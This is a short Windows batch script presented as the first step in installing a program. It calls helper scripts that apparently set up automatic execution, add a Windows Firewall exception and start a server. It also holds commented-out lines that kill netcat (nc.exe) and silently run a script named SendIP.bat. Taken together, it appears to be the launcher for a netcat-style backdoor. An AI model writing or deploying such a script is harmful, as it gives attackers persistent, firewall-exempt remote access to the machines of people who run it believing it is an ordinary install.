::Execute the preliminary action to install the program

@echo off
::taskkill.exe /f /im nc.exe
call "AutomaticExecution.bat"
call "AddWindowsFirewallException.bat"
:: silentRun.exe "SendIP.bat"
call "Server.bat"
